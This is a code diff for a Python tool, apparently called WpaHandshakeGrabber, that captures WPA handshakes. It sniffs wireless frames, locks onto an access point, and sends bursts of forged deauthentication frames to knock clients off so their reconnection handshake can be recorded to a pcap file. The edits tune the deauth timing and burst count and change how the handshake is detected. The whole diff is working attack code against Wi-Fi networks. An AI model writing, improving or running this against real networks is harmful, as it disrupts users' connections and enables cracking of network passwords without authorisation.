@@ -6,6 +6,8 @@ from lib.Pcap import Pcap
 from lib.Logger import Logger
 from lib.Target import Target
 from lib.Deauth import Deauth
+from lib.Logger import Logger
+from lib.Target import Target
 from lib.APManager import APManager
 from lib.AccessPoint import AccessPoint
 from frames.Radiotap802_11 import Radiotap802_11
@@ -93,16 +95,13 @@ class WpaHandshakeGrabber():
                     pcap_file = WpaHandshakeGrabber.startPcap(ap_manager.locked_ap)
                     WpaHandshakeGrabber.switchToLockedTargetView(form, ap_manager.locked_ap.ssid)
             elif current_state == 'ap_locked':
+                WpaHandshakeGrabber.writePcap(pcap_file, packet)
+
                 if frame.isAckBlockFrame(): # change this to top like above
                     target = Target(frame.destination)
                     ap_manager.addTarget(target, frame.source)
 
-                if (frame.isQOSFrame()):
-                    Logger.log('dest {} == {}'.format(frame.destination, ap_manager.locked_ap.mac))
-                    Logger.log('srce {} == {}'.format(frame.source, ap_manager.locked_ap.mac))
-                    Logger.log('packet len = {}'.format(len(packet)))
-                    Logger.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
-                if frame.isQOSFrame() and len(packet) == 163 and frame.source == ap_manager.locked_ap.mac:
+                if frame.isQOSFrame() and len(packet) == 163 and frame.destination == ap_manager.locked_ap.mac:
                     Logger.log('Handshake Found on {}'.format(ap_manager.locked_ap.ssid))
                     current_state = 'scanning'
                     mac_collected.append(ap_manager.locked_ap.mac)
@@ -116,14 +115,12 @@ class WpaHandshakeGrabber():
                     s.bind((form.interface, 0x0003))
                     continue
                 
-                WpaHandshakeGrabber.writePcap(pcap_file, packet)
-                if last_deauth is None or time.time() - last_deauth > 90:
-                    Logger.log("!!!IN deauth")
+                if last_deauth is None or time.time() - last_deauth > 60:
                     last_deauth = time.time()
                     target = ap_manager.locked_ap.targets.pop()
                     deauth_frame = Deauth.getDeauthFrame(ap_manager.locked_ap, target)
-                    WpaHandshakeGrabber.writePcap(pcap_file, deauth_frame)
-                    for x in range(0, 10):
+                    WpaHandshakeGrabber.writePcap(pcap_file, packet)
+                    for x in range(0, 3):
                         s.send(deauth_frame)
                             
             
